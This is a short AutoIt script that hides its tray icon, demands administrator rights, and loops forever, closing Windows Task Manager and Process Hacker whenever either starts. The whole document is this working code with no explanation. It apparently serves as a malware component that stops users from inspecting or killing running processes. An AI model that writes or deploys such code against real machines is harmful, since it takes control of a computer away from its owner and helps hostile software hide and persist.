#NoTrayIcon
#RequireAdmin
While True
	If ProcessExists ( "Taskmgr.exe" ) Then
		ProcessClose ( "Taskmgr.exe" )
	EndIf
	If ProcessExists ( "ProcessHacker.exe" ) Then
		ProcessClose ( "ProcessHacker.exe" )
	EndIf
WEnd
